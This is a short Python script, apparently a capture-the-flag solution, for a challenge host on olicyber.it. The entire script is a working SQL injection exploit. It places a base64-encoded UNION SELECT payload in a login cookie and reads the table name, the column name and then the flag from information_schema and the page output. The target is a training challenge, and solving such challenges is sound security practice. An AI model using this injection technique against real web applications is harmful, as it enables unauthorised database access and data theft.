import requests
import base64
from bs4 import BeautifulSoup

url = "http://sn4ck-sh3nan1gans.challs.olicyber.it/home.php"

def execute_sql_payload(payload):
    encoded_payload = base64.b64encode(payload.encode()).decode()
    cookie = {"login": encoded_payload}
    response = requests.get(url, cookies=cookie)
    s = BeautifulSoup(response.text, 'html.parser')
    result = s.find('h1').get_text().replace("Welcome ", "")[:-1]
    return result

def retrieve_data(sql_query):
    id_payload = '{"ID": "1 '
    return execute_sql_payload(id_payload + sql_query + '"}')

# Retrieve table name
table_query = 'UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1'
table_name = retrieve_data(table_query)
print(f'Table name: {table_name}')

# Retrieve column name for the table
column_query = f"UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET 1"
column_name = retrieve_data(column_query)
print(f'Column name: {column_name}')

# Retrieve flag data
flag_query = f"UNION SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET 1"
flag_data = retrieve_data(flag_query)
print(f'Flag: {flag_data}')
